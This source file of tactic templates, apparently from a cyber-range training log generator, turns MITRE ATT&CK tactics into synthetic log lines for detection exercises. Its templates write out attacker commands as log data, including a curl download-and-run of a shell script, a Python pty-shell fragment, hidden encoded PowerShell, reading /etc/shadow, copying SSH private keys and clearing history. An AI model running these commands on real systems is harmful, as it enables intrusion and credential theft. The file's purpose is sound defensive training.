// ============================================================================
// Tactic templates — the raw material the scenario compiler turns into steps.
//
// WHAT THIS IS. A CiAB client profile names MITRE technique IDs: T1566.001,
// T1486, T1003.001. Fifteen of those have a hand-written playbook in
// src/incident/playbooks/. The other seven hundred do not, and never will --
// nobody is going to author 700 playbooks, and a profile that mentions one we
// have not written must still produce an exercise rather than an error.
//
// So the compiler does not look techniques up. It maps each technique to a
// TACTIC, and synthesises a step out of that tactic's material: a source, a set
// of weighted message templates, metadata, and timing. Fourteen tactics is a
// table a human can read and keep honest. Seven hundred techniques is not.
//
// THE HARD CONSTRAINT, and the reason every line below is the shape it is.
// test/loggen-playbooks.test.js proves that any (source.type, source.name) pair,
// any closed-vocabulary metadata value, and any /8 address space that appears
// ONLY during an attack is a one-terms-aggregation answer key -- one click in
// Discover and the exercise is over, with nothing in review to show for it.
//
// Therefore EVERYTHING here is drawn from the benign floor's own vocabulary:
//
//   * every `source` below is one of the 25 (type, name) pairs
//     src/incident/playbooks/host-baseline.json already emits, paired with the
//     same host pool the floor uses for it;
//   * every literal metadata value below already occurs in the floor's metadata
//     (event_action has 33 values, service 13, status 6, shell 2, outcome 2,
//     protocol 1 -- and nothing here invents a 34th);
//   * everything else is a {{token}}, resolved by the compiler out of the floor's
//     own pools, so the values are the client's ordinary values.
//
// test/scenario-templates.test.js re-derives all of that FROM the floor and
// fails if this file drifts out of it. Do not add a source or a literal here
// without adding it to the floor first.
//
// WHAT DOES NOT BELONG IN A MESSAGE. The line must report what happened, never
// what it means. "Periodic outbound connection detected, jitter<5%" is not
// telemetry, it is the answer key with a timestamp on it. The contract's VERDICT
// regex rejects the whole vocabulary of conclusions (suspect/anomal/beacon/
// staged/malicious/detected/...), and so should you.
//
// Pure module: no DB, no fs, no network, no require of the floor JSON. The floor
// is a fact this file MIRRORS and the test VERIFIES; loading it here would make
// a pure table into an I/O dependency for every consumer.
// ============================================================================
'use strict';

// ---------------------------------------------------------------------------
// The four entities the compiler must resolve.
//
// cc-emit resolves entities ONCE per run and re-samples pools per event, which
// is the whole reason a run reads as one adversary instead of a shuffle. These
// are the names the templates below use; a compiler that binds them to anything
// outside the stated range breaks an anti-oracle assertion, not just realism.
// ---------------------------------------------------------------------------
const REQUIRED_ENTITIES = {
  source_ip: 'The adversary\'s address. MUST resolve into a /8 the benign floor '
    + 'already uses (203.0.113.x from `extips`, or the lane band from `lanips`). '
    + '"Not one of ours" is a one-click filter AND the wrong lesson.',
  pivot_ip: 'The internal foothold address the adversary operates from once inside. '
    + 'MUST come from the lane\'s own `lanips` band -- lateral movement that '
    + 'originates outside the estate is not lateral movement.',
  target: 'The victim host. MUST be drawn from one of the floor\'s host pools '
    + '(a profile-derived pool for a compiled scenario), never a bare asset name '
    + 'the floor never emits.',
  actor: 'The account the adversary is using. MUST come from the floor\'s `users` '
    + 'pool. An account that only ever appears during the attack is the answer.',
};

/** Tokens cc-emit resolves itself; not pools, not entities. */
const BUILTIN_TOKENS = ['rand', 'port', 'pid', 'seq'];

// ---------------------------------------------------------------------------
// Kill-chain order.
//
// ATT&CK Navigator column order, which is also the order a campaign narrates in.
// Note C2 (TA0011) sits BEFORE exfiltration (TA0010) despite the lower number --
// the channel exists before anything leaves through it, and a compiled scenario
// that emits the gigabyte transfer before the check-ins tells the story backwards.
// ---------------------------------------------------------------------------
const KILL_CHAIN = [
  'TA0043', // Reconnaissance
  'TA0042', // Resource Development
  'TA0001', // Initial Access
  'TA0002', // Execution
  'TA0003', // Persistence
  'TA0004', // Privilege Escalation
  'TA0005', // Defense Evasion
  'TA0006', // Credential Access
  'TA0007', // Discovery
  'TA0008', // Lateral Movement
  'TA0009', // Collection
  'TA0011', // Command and Control
  'TA0010', // Exfiltration
  'TA0040', // Impact
];

/**
 * The slice the fallback is allowed to land in.
 *
 * Reconnaissance and Resource Development happen on the adversary's own
 * infrastructure. They are in the table because a profile can name T1595 and the
 * compiler must not throw, but an UNMAPPED technique should never be guessed
 * into them: the guess would produce almost no victim-side telemetry, and a step
 * that emits nothing is a phase of the exercise that silently does not exist.
 */
const FALLBACK_CHAIN = KILL_CHAIN.slice(2);

/**
 * Where an unmapped technique lands when the compiler gives no position hint.
 *
 * Execution, deliberately: it is the one tactic that is true of essentially
 * every technique that produces a log line at all -- something ran on a host.
 * Guessing "Impact" and being wrong invents a catastrophe that never happened.
 */
const FALLBACK_TACTIC = 'TA0002';

// ---------------------------------------------------------------------------
// TACTIC_TEMPLATES
//
// Each entry:
//   id, name, phase   the tactic and its kill-chain index
//   defaults          count/gap/spread/level for a step built from this tactic.
//                     gap is ELASTIC (absorbs the requested duration), spread is
//                     RIGID (the burst itself, never scaled) -- see cc-emit.
//   variants[]        one step's worth of material each:
//     source          a (type, name) pair the floor already emits, with the host
//                     pool the floor pairs it with. `host` is a token so the
//                     compiler can swap in a profile-derived pool or {{target}}.
//     weight          how strongly to prefer this variant when picking one
//     metadata        step-level metadata (merged UNDER each template's own)
//     templates[]     weighted messages; a template may override level/metadata
//     defaults        optional per-variant timing override
// ---------------------------------------------------------------------------
const TACTIC_TEMPLATES = {

  // -------------------------------------------------------------------------
  TA0043: {
    id: 'TA0043',
    name: 'Reconnaissance',
    phase: 0,
    defaults: { count: 240, gap: '0s', spread: '180s', level: 'WARN' },
    variants: [
      {
        weight: 3,
        source: { type: 'webserver', name: 'nginx-proxy', host: '{{webpool}}' },
        metadata: {
          event_action: 'http-request',
          src_ip: '{{source_ip}}',
          status: '404',
          path: '{{paths}}',
          user_agent: '{{agents}}',
        },
        templates: [
          { weight: 4, level: 'WARN', message: '{{source_ip}} - - "GET {{paths}} HTTP/1.1" 404 {{rand:120-600}} "-" "{{agents}}"' },
          { weight: 2, level: 'WARN', message: '{{source_ip}} - - "GET /.env HTTP/1.1" 404 {{rand:120-600}} "-" "{{agents}}"' },
          { weight: 2, level: 'INFO', message: '{{source_ip}} - - "HEAD / HTTP/1.1" 200 0 "-" "{{agents}}"', metadata: { status: '200' } },
          { weight: 1, level: 'WARN', message: '{{source_ip}} - - "GET /admin/config.php HTTP/1.1" 403 {{rand:120-600}} "-" "{{agents}}"', metadata: { status: '403' } },
        ],
      },
      {
        weight: 2,
        source: { type: 'firewall', name: 'iptables', host: '{{fwpool}}' },
        metadata: {
          event_action: 'connection-blocked',
          src_ip: '{{source_ip}}',
          dst_ip: '{{dstips}}',
          protocol: 'tcp',
        },
        templates: [
          { weight: 3, level: 'WARN', message: 'DROP IN=eth1 OUT=eth0 SRC={{source_ip}} DST={{dstips}} LEN=44 TOS=0x00 PREC=0x00 TTL={{rand:40-58}} ID={{rand:1-65535}} DF PROTO=TCP SPT={{port}} DPT={{rand:1-1024}} WINDOW=1024 RES=0x00 SYN URGP=0' },
          { weight: 1, level: 'INFO', message: 'ACCEPT IN=eth1 OUT=eth0 SRC={{source_ip}} DST={{dstips}} LEN=44 TOS=0x00 PREC=0x00 TTL={{rand:40-58}} ID={{rand:1-65535}} DF PROTO=TCP SPT={{port}} DPT=443 WINDOW=1024 RES=0x00 SYN URGP=0', metadata: { event_action: 'connection-allowed' } },
        ],
      },
    ],
  },

  // -------------------------------------------------------------------------
  TA0042: {
    id: 'TA0042',
    name: 'Resource Development',
    phase: 1,
    // Low count on purpose. This tactic happens on the adversary's own kit; the
    // only thing the victim's estate can honestly show is an outbound fetch.
    defaults: { count: 24, gap: '2m', spread: '60s', level: 'INFO' },
    variants: [
      {
        weight: 2,
        source: { type: 'webserver', name: 'squid-proxy', host: '{{fwpool}}' },
        metadata: {
          event_action: 'http-request',
          src_ip: '{{pivot_ip}}',
          dst_ip: '{{dstips}}',
          status: '200',
          protocol: 'tcp',
        },
        templates: [
          { weight: 3, level: 'INFO', message: '{{target}} TCP_MISS/200 {{rand:400-90000}} GET https://{{sites}}/index - DIRECT/{{sites}} text/html' },
          { weight: 2, level: 'INFO', message: '{{target}} TCP_MISS/200 {{rand:20000-900000}} GET https://{{sites}}/static/app.js - DIRECT/{{sites}} application/javascript' },
          { weight: 1, level: 'WARN', message: '{{target}} TCP_DENIED/403 {{rand:200-900}} CONNECT {{sites}}:443 - NONE/- text/html', metadata: { event_action: 'connection-blocked', status: '403' } },
        ],
      },
    ],
  },

  // -------------------------------------------------------------------------
  TA0001: {
    id: 'TA0001',
    name: 'Initial Access',
    phase: 2,
    defaults: { count: 14, gap: '1m', spread: '60s', level: 'INFO' },
    variants: [
      {
        weight: 3,
        source: { type: 'email', name: 'mail-gateway', host: '{{mailpool}}' },
        metadata: {
          event_action: 'email-delivered',
          user: '{{actor}}',
          src_ip: '{{source_ip}}',
          service: 'postfix',
          outcome: 'success',
        },
        templates: [
          // "for {{actor}}@corp.example from ..." deliberately carries the domain:
          // the contract's self-contradiction check matches bare account names
          // only, and an addressed recipient is not a disagreement with
          // metadata.user. Mirrors the floor's own mail-gateway phrasing exactly.
          { weight: 4, level: 'INFO', message: 'Message accepted for {{actor}}@corp.example from billing@{{senders}} relay={{source_ip}} size={{rand:20000-90000}}' },
          { weight: 3, level: 'INFO', message: 'Message delivered to {{actor}}@corp.example queue={{rand:100000-999999}} delay={{rand:1-40}}s' },
          { weight: 1, level: 'WARN', message: 'Message rejected from bounce@{{senders}} reason=spf_softfail', metadata: { outcome: 'failure', event_action: 'error' } },
        ],
      },
      {
        weight: 3,
        source: { type: 'webserver', name: 'nginx-proxy', host: '{{webpool}}' },
        metadata: {
          event_action: 'http-request',
          src_ip: '{{source_ip}}',
          status: '200',
          path: '{{paths}}',
          user_agent: '{{agents}}',
        },
        templates: [
          { weight: 3, level: 'INFO', message: '{{source_ip}} - - "POST /api/v1/orders HTTP/1.1" 201 {{rand:120-900}} "-" "{{agents}}"', metadata: { status: '200' } },
          { weight: 2, level: 'ERROR', message: '{{source_ip}} - - "GET /api/reports HTTP/1.1" 500 {{rand:120-600}} "-" "{{agents}}"', metadata: { event_action: 'error', status: '500' } },
          { weight: 2, level: 'WARN', message: '{{source_ip}} - - "GET {{paths}} HTTP/1.1" 404 {{rand:120-600}} "-" "{{agents}}"', metadata: { status: '404' } },
        ],
      },
      {
        weight: 2,
        source: { type: 'authentication', name: 'sshd', host: '{{target}}' },
        metadata: {
          event_action: 'logon-success',
          outcome: 'success',
          user: '{{actor}}',
          src_ip: '{{source_ip}}',
          service: 'sshd',
        },
        templates: [
          { weight: 3, level: 'INFO', message: 'Accepted password for {{actor}} from {{source_ip}} port {{port}} ssh2' },
          { weight: 2, level: 'INFO', message: 'pam_unix(sshd:session): session opened for user {{actor}} by (uid=0)', metadata: { event_action: 'session-opened' } },
        ],
      },
    ],
  },

  // -------------------------------------------------------------------------
  TA0002: {
    id: 'TA0002',
    name: 'Execution',
    phase: 3,
    defaults: { count: 30, gap: '2m', spread: '90s', level: 'INFO' },
    variants: [
      {
        weight: 3,
        source: { type: 'host', name: 'bash', host: '{{target}}' },
        metadata: { event_action: 'process-start', user: '{{actor}}', shell: 'bash' },
        templates: [
          { weight: 3, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=curl -s http://{{source_ip}}/{{rand:1000-9999}}.sh -o /tmp/.{{rand:100000-999999}}' },
          { weight: 2, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=bash /tmp/.{{rand:100000-999999}}' },
          { weight: 2, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=python3 -c import socket,os,pty' },
        ],
      },
      {
        weight: 2,
        source: { type: 'host', name: 'cmd', host: '{{wspool}}' },
        metadata: { event_action: 'process-start', user: '{{actor}}', shell: 'cmd.exe' },
        templates: [
          { weight: 3, level: 'INFO', message: 'pid={{pid}} user={{actor}} cmd=powershell.exe -NoProfile -W Hidden -EncodedCommand JABzAD0A{{rand:100000-999999}}' },
          { weight: 2, level: 'INFO', message: 'pid={{pid}} user={{actor}} cmd=cmd.exe /c wmic process call create "rundll32.exe C:\\Users\\{{actor}}\\AppData\\Local\\Temp\\{{rand:1000-9999}}.dll"' },
          { weight: 1, level: 'WARN', message: 'pid={{pid}} user={{actor}} cmd=cmd.exe /c net use Z: {{shares}} - exited 0x80070056', metadata: { event_action: 'error' } },
        ],
      },
      {
        weight: 1,
        source: { type: 'host', name: 'auditd', host: '{{target}}' },
        metadata: { event_action: 'syscall', user: '{{actor}}' },
        templates: [
          { weight: 1, level: 'INFO', message: 'type=SYSCALL arch=c000003e syscall=59 success=yes exit=0 ppid={{pid}} pid={{pid}} auid={{rand:1000-1010}} uid={{rand:1000-1010}} comm="{{cmds}}" key="syscall"' },
        ],
      },
    ],
  },

  // -------------------------------------------------------------------------
  TA0003: {
    id: 'TA0003',
    name: 'Persistence',
    phase: 4,
    // Small and slow. Real footholds are installed once, not two hundred times,
    // and a step that repeats an account creation 200 times is its own oracle.
    defaults: { count: 10, gap: '3m', spread: '45s', level: 'INFO' },
    variants: [
      {
        weight: 3,
        source: { type: 'authentication', name: 'useradd', host: '{{authpool}}' },
        // Deliberately the floor's OWN account-naming shape. Camouflage is the
        // point: what a student must notice is a contractor account created at
        // 03:00 by the adversary's session, not one whose NAME is unusual.
        metadata: {
          event_action: 'account-created',
          user: '{{actor}}',
          target_user: 'contractor',
          service: 'useradd',
        },
        templates: [
          { weight: 1, level: 'INFO', message: 'new user: name=contractor{{rand:10-99}}, UID={{rand:2000-2400}}, GID=100, home=/home/contractor{{rand:10-99}}, shell=/bin/bash' },
        ],
      },
      {
        weight: 2,
        source: { type: 'host', name: 'systemd', host: '{{target}}' },
        metadata: { event_action: 'service-started', user: '{{actor}}' },
        templates: [
          { weight: 2, level: 'INFO', message: 'Created symlink /etc/systemd/system/multi-user.target.wants/{{svcs}}.service -> /etc/systemd/system/{{svcs}}.service' },
          { weight: 1, level: 'INFO', message: 'Started {{svcs}}.service' },
          { weight: 1, level: 'INFO', message: 'Reloading systemd manager configuration', metadata: { event_action: 'config-reload' } },
        ],
      },
      {
        weight: 2,
        source: { type: 'host', name: 'registry', host: '{{wspool}}' },
        metadata: { event_action: 'registry-set', user: '{{actor}}' },
        templates: [
          { weight: 2, level: 'INFO', message: 'SetValue HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{{svcs}} = C:\\Users\\{{actor}}\\AppData\\Roaming\\{{svcs}}.exe' },
          { weight: 1, level: 'INFO', message: 'SetValue HKLM\\SYSTEM\\CurrentControlSet\\Services\\{{svcs}}\\ImagePath = C:\\Windows\\Temp\\{{rand:1000-9999}}.exe' },
        ],
      },
      {
        weight: 1,
        source: { type: 'host', name: 'sudoers', host: '{{target}}' },
        metadata: { event_action: 'sudoers-changed', user: '{{actor}}' },
        templates: [
          { weight: 1, level: 'INFO', message: 'sudoers file syntax check passed (visudo -c)' },
          { weight: 1, level: 'WARN', message: 'visudo: /etc/sudoers.d/90-ops busy, try again later' },
        ],
      },
    ],
  },

  // -------------------------------------------------------------------------
  TA0004: {
    id: 'TA0004',
    name: 'Privilege Escalation',
    phase: 5,
    defaults: { count: 20, gap: '2m', spread: '60s', level: 'WARN' },
    variants: [
      {
        weight: 3,
        source: { type: 'host', name: 'sudo', host: '{{target}}' },
        metadata: { event_action: 'privilege-use', user: '{{actor}}', shell: 'bash' },
        templates: [
          { weight: 3, level: 'WARN', message: '{{actor}} : user NOT in sudoers ; TTY=pts/{{rand:0-4}} ; PWD=/home/{{actor}} ; USER=root ; COMMAND=/usr/bin/systemctl restart {{svcs}}' },
          { weight: 2, level: 'INFO', message: '{{actor}} : TTY=pts/{{rand:0-4}} ; PWD=/home/{{actor}} ; USER=root ; COMMAND=/bin/bash' },
          { weight: 1, level: 'INFO', message: '{{actor}} : TTY=pts/{{rand:0-4}} ; PWD=/home/{{actor}} ; USER=root ; COMMAND=/usr/bin/find / -perm -4000 -type f' },
        ],
      },
      {
        weight: 2,
        source: { type: 'authentication', name: 'usermod', host: '{{authpool}}' },
        metadata: {
          event_action: 'group-modified',
          user: '{{actor}}',
          target_user: '{{actor}}',
          service: 'usermod',
        },
        templates: [
          { weight: 2, level: 'INFO', message: 'add "{{actor}}" to group "wheel"' },
          { weight: 1, level: 'INFO', message: 'add "{{actor}}" to group "docker"' },
        ],
      },
      {
        weight: 1,
        source: { type: 'host', name: 'usermod', host: '{{target}}' },
        metadata: {
          event_action: 'account-modified',
          user: '{{actor}}',
          target_user: 'contractor',
          service: 'usermod',
        },
        templates: [
          { weight: 1, level: 'INFO', message: 'usermod: change user contractor{{rand:10-99}} shell to /bin/bash' },
        ],
      },
    ],
  },

  // -------------------------------------------------------------------------
  TA0005: {
    id: 'TA0005',
    name: 'Defense Evasion',
    phase: 6,
    defaults: { count: 14, gap: '2m', spread: '45s', level: 'WARN' },
    variants: [
      {
        weight: 3,
        source: { type: 'host', name: 'systemd', host: '{{target}}' },
        metadata: { event_action: 'service-stopped', user: '{{actor}}' },
        templates: [
          { weight: 3, level: 'WARN', message: 'Stopping auditd.service - log rotation', metadata: { event_action: 'audit-stopped' } },
          { weight: 2, level: 'WARN', message: 'Stopped falcon-sensor.service - scheduled patching window' },
          { weight: 1, level: 'WARN', message: 'Disabled unit telemetry-agent.service (masked by policy)', metadata: { event_action: 'service-disabled' } },
        ],
      },
      {
        weight: 2,
        source: { type: 'host', name: 'auditd', host: '{{target}}' },
        metadata: { event_action: 'audit', user: '{{actor}}' },
        templates: [
          { weight: 2, level: 'INFO', message: 'type=CONFIG_CHANGE op=remove_rule key="privileged" list=4 res=1' },
          { weight: 1, level: 'WARN', message: 'type=DAEMON_ERR op=queue msg=audit backlog limit exceeded, lost={{rand:1-400}}' },
        ],
      },
      {
        weight: 2,
        source: { type: 'host', name: 'bash', host: '{{target}}' },
        metadata: { event_action: 'file-write', user: '{{actor}}', path: '{{files}}', shell: 'bash' },
        templates: [
          { weight: 2, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=shred -u {{files}}' },
          { weight: 1, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=history -c' },
          { weight: 1, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=touch -r /etc/hosts {{files}}' },
        ],
      },
      {
        weight: 1,
        source: { type: 'firewall', name: 'firewalld', host: '{{fwpool}}' },
        metadata: { event_action: 'rule-added', service: 'firewalld' },
        templates: [
          { weight: 2, level: 'INFO', message: 'Rule removed: zone=public port={{rand:1024-9999}}/tcp accept (change request CHG-{{rand:1000-9999}})' },
          { weight: 1, level: 'INFO', message: 'Zone drop: interface eth2 bound', metadata: { event_action: 'zone-changed' } },
        ],
      },
    ],
  },

  // -------------------------------------------------------------------------
  TA0006: {
    id: 'TA0006',
    name: 'Credential Access',
    phase: 7,
    // The one tactic whose burst SHAPE is the finding. 240 attempts inside a
    // rigid 90s window is a brute force; the same 240 stretched over two hours
    // is not, and no threshold rule a student writes will fire on it. cc-emit
    // never scales `spread`, which is exactly why this stays honest at 2h.
    defaults: { count: 240, gap: '3m', spread: '90s', level: 'WARN' },
    variants: [
      {
        weight: 4,
        source: { type: 'authentication', name: 'sshd', host: '{{target}}' },
        metadata: {
          event_action: 'logon-failed',
          outcome: 'failure',
          user: '{{users}}',
          src_ip: '{{source_ip}}',
          service: 'sshd',
        },
        templates: [
          { weight: 6, level: 'WARN', message: 'Failed password for {{users}} from {{source_ip}} port {{port}} ssh2' },
          { weight: 2, level: 'WARN', message: 'error: maximum authentication attempts exceeded for {{users}} from {{source_ip}} port {{port}} ssh2 [preauth]', metadata: { event_action: 'account-locked' } },
          { weight: 2, level: 'INFO', message: 'Connection closed by authenticating user {{users}} {{source_ip}} port {{port}} [preauth]' },
          // The one that succeeds. Overrides user, because the message names the
          // account that got in and metadata must not disagree with it.
          { weight: 1, level: 'INFO', message: 'Accepted password for {{actor}} from {{source_ip}} port {{port}} ssh2', metadata: { event_action: 'logon-success', outcome: 'success', user: '{{actor}}' } },
        ],
      },
      {
        weight: 2,
        source: { type: 'authentication', name: 'auth-svc', host: '{{authpool}}' },
        metadata: {
          event_action: 'logon-failed',
          outcome: 'failure',
          user: '{{users}}',
          service: 'auth-svc',
        },
        templates: [
          { weight: 4, level: 'WARN', message: 'Token rejected for {{users}} reason=bad_credentials' },
          { weight: 2, level: 'WARN', message: 'MFA challenge failed for {{users}} method=totp' },
          { weight: 1, level: 'INFO', message: 'Token issued for {{actor}} client_id=svc-{{rand:1000-9999}} scope=read,write', metadata: { event_action: 'logon-success', outcome: 'success', user: '{{actor}}' } },
        ],
      },
      {
        weight: 2,
        source: { type: 'host', name: 'bash', host: '{{target}}' },
        metadata: { event_action: 'file-read', user: '{{actor}}', path: '{{files}}', shell: 'bash' },
        defaults: { count: 24, gap: '2m', spread: '45s', level: 'INFO' },
        templates: [
          { weight: 3, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=cat /etc/shadow' },
          { weight: 2, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=grep -r password {{docdirs}}' },
          { weight: 2, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=cp /home/{{users}}/.ssh/id_rsa /tmp/.{{rand:100000-999999}}' },
        ],
      },
    ],
  },

  // -------------------------------------------------------------------------
  TA0007: {
    id: 'TA0007',
    name: 'Discovery',
    phase: 8,
    defaults: { count: 70, gap: '2m', spread: '120s', level: 'INFO' },
    variants: [
      {
        weight: 3,
        source: { type: 'host', name: 'bash', host: '{{target}}' },
        metadata: { event_action: 'process-start', user: '{{actor}}', shell: 'bash' },
        templates: [
          { weight: 3, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=uname -a' },
          { weight: 3, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=cat /etc/passwd' },
          { weight: 2, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=ss -tnp' },
          { weight: 2, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=id' },
          { weight: 2, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=find {{docdirs}} -type f -name "*.kdbx"' },
        ],
      },
      {
        weight: 2,
        source: { type: 'host', name: 'cmd', host: '{{wspool}}' },
        metadata: { event_action: 'process-start', user: '{{actor}}', shell: 'cmd.exe' },
        templates: [
          { weight: 3, level: 'INFO', message: 'pid={{pid}} user={{actor}} cmd=cmd.exe /c net group "Domain Admins" /domain' },
          { weight: 2, level: 'INFO', message: 'pid={{pid}} user={{actor}} cmd=cmd.exe /c nltest /domain_trusts' },
          { weight: 2, level: 'INFO', message: 'pid={{pid}} user={{actor}} cmd=cmd.exe /c net view /domain' },
        ],
      },
      {
        weight: 2,
        source: { type: 'firewall', name: 'iptables', host: '{{fwpool}}' },
        metadata: {
          event_action: 'connection-allowed',
          src_ip: '{{pivot_ip}}',
          dst_ip: '{{dstips}}',
          protocol: 'tcp',
        },
        templates: [
          { weight: 3, level: 'INFO', message: 'ACCEPT IN=eth0 OUT=eth1 SRC={{pivot_ip}} DST={{dstips}} LEN=44 TOS=0x00 PREC=0x00 TTL=64 ID={{rand:1-65535}} PROTO=TCP SPT={{port}} DPT={{rand:1-1024}} WINDOW=1024 RES=0x00 SYN URGP=0' },
          { weight: 2, level: 'INFO', message: 'ACCEPT IN=eth0 OUT=eth1 SRC={{pivot_ip}} DST={{dstips}} LEN=44 TOS=0x00 PREC=0x00 TTL=64 ID={{rand:1-65535}} PROTO=TCP SPT={{port}} DPT=445 WINDOW=1024 RES=0x00 SYN URGP=0' },
          { weight: 1, level: 'WARN', message: 'DROP IN=eth0 OUT=eth1 SRC={{pivot_ip}} DST={{dstips}} LEN=44 TOS=0x00 PREC=0x00 TTL=64 ID={{rand:1-65535}} PROTO=TCP SPT={{port}} DPT={{rand:1-1024}} WINDOW=1024 RES=0x00 SYN URGP=0', metadata: { event_action: 'connection-blocked' } },
        ],
      },
    ],
  },

  // -------------------------------------------------------------------------
  TA0008: {
    id: 'TA0008',
    name: 'Lateral Movement',
    phase: 9,
    defaults: { count: 26, gap: '3m', spread: '90s', level: 'INFO' },
    variants: [
      {
        weight: 3,
        source: { type: 'authentication', name: 'sshd', host: '{{srvpool}}' },
        metadata: {
          event_action: 'logon-success',
          outcome: 'success',
          user: '{{actor}}',
          src_ip: '{{pivot_ip}}',
          service: 'sshd',
        },
        templates: [
          { weight: 3, level: 'INFO', message: 'Accepted publickey for {{actor}} from {{pivot_ip}} port {{port}} ssh2' },
          { weight: 2, level: 'INFO', message: 'pam_unix(sshd:session): session opened for user {{actor}} by (uid=0)', metadata: { event_action: 'session-opened' } },
          { weight: 1, level: 'WARN', message: 'Failed password for {{actor}} from {{pivot_ip}} port {{port}} ssh2', metadata: { event_action: 'logon-failed', outcome: 'failure' } },
        ],
      },
      {
        weight: 2,
        source: { type: 'authentication', name: 'rdp', host: '{{wspool}}' },
        metadata: {
          event_action: 'logon-success',
          outcome: 'success',
          user: '{{actor}}',
          src_ip: '{{pivot_ip}}',
          service: 'rdp',
        },
        templates: [
          { weight: 3, level: 'INFO', message: 'Remote desktop session established user={{actor}} src={{pivot_ip}}' },
          { weight: 1, level: 'INFO', message: 'Remote desktop reconnected user={{actor}} src={{pivot_ip}}' },
        ],
      },
      {
        weight: 2,
        source: { type: 'host', name: 'cmd', host: '{{wspool}}' },
        metadata: { event_action: 'process-start', user: '{{actor}}', shell: 'cmd.exe' },
        templates: [
          { weight: 3, level: 'INFO', message: 'pid={{pid}} user={{actor}} cmd=cmd.exe /c net use Z: {{shares}}' },
          { weight: 2, level: 'INFO', message: 'pid={{pid}} user={{actor}} cmd=cmd.exe /c sc \\\\{{target}} create {{svcs}} binPath= C:\\Windows\\Temp\\{{rand:1000-9999}}.exe' },
        ],
      },
    ],
  },

  // -------------------------------------------------------------------------
  TA0009: {
    id: 'TA0009',
    name: 'Collection',
    phase: 10,
    defaults: { count: 110, gap: '3m', spread: '150s', level: 'INFO' },
    variants: [
      {
        weight: 3,
        source: { type: 'host', name: 'auditd', host: '{{target}}' },
        metadata: { event_action: 'file-read', user: '{{actor}}', path: '{{docdirs}}/{{docs}}' },
        templates: [
          { weight: 4, level: 'INFO', message: 'type=PATH item=0 name="{{docdirs}}/{{docs}}" inode={{rand:100000-999999}} dev=fd:00 mode=0100644 ouid={{rand:1000-1010}} ogid={{rand:1000-1010}} rdev=00:00 nametype=NORMAL auid={{rand:1000-1010}} key="file-read"' },
          { weight: 2, level: 'INFO', message: 'type=SYSCALL arch=c000003e syscall=257 success=yes exit={{rand:3-40}} comm="tar" key="file-write"', metadata: { event_action: 'file-write' } },
        ],
      },
      {
        weight: 2,
        source: { type: 'host', name: 'bash', host: '{{target}}' },
        metadata: { event_action: 'process-start', user: '{{actor}}', shell: 'bash' },
        templates: [
          { weight: 3, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=tar -czf /var/backups/{{rand:100000-999999}}.tgz {{docdirs}}' },
          { weight: 2, level: 'INFO', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=cp -r {{docdirs}} /var/backups/' },
        ],
      },
      {
        weight: 2,
        source: { type: 'database', name: 'postgres-primary', host: '{{dbpool}}' },
        metadata: {
          event_action: 'query',
          user: '{{actor}}',
          table: '{{tbls}}',
          service: 'postgresql',
        },
        templates: [
          { weight: 3, level: 'INFO', message: 'duration: {{rand:900-9000}}ms  statement: SELECT * FROM {{tbls}}' },
          { weight: 2, level: 'INFO', message: 'duration: {{rand:400-4000}}ms  statement: COPY {{tbls}} TO STDOUT WITH CSV HEADER' },
          { weight: 1, level: 'WARN', message: 'could not receive data from client: Connection reset by peer', metadata: { event_action: 'error' } },
        ],
      },
      {
        weight: 2,
        source: { type: 'application', name: 'reporting-api', host: '{{apppool}}' },
        metadata: {
          event_action: 'export',
          user: '{{actor}}',
          table: '{{tbls}}',
          service: 'reporting-api',
        },
        templates: [
          { weight: 3, level: 'INFO', message: 'export completed user={{actor}} rows={{rand:20000-400000}} format=csv' },
          { weight: 1, level: 'WARN', message: 'export failed user={{actor}} reason=timeout after {{rand:30-120}}s', metadata: { outcome: 'failure', event_action: 'error' } },
        ],
      },
    ],
  },

  // -------------------------------------------------------------------------
  TA0011: {
    id: 'TA0011',
    name: 'Command and Control',
    phase: 11,
    // The finding here is REGULARITY, not volume: small transfers on a steady
    // cadence. Long spread, modest count -- and never a message that says so.
    defaults: { count: 130, gap: '2m', spread: '240s', level: 'INFO' },
    variants: [
      {
        weight: 3,
        source: { type: 'firewall', name: 'netflow', host: '{{fwpool}}' },
        metadata: {
          event_action: 'flow-record',
          src_ip: '{{pivot_ip}}',
          dst_ip: '{{source_ip}}',
          protocol: 'tcp',
        },
        templates: [
          { weight: 4, level: 'INFO', message: 'Flow record: {{target}} -> {{source_ip}}:443 proto=TCP bytes={{rand:400-1400}} packets={{rand:4-9}} duration={{rand:1-3}}s flags=.AP.SF' },
          { weight: 2, level: 'INFO', message: 'Flow record: {{target}} -> {{source_ip}}:53 proto=UDP bytes={{rand:80-900}} packets={{rand:1-6}} duration={{rand:1-3}}s flags=......' },
        ],
      },
      {
        weight: 2,
        source: { type: 'webserver', name: 'squid-proxy', host: '{{fwpool}}' },
        metadata: {
          event_action: 'http-request',
          src_ip: '{{pivot_ip}}',
          dst_ip: '{{source_ip}}',
          status: '200',
          protocol: 'tcp',
        },
        templates: [
          { weight: 3, level: 'INFO', message: '{{target}} TCP_MISS/204 0 POST https://{{sites}}/api/telemetry - DIRECT/{{sites}} -' },
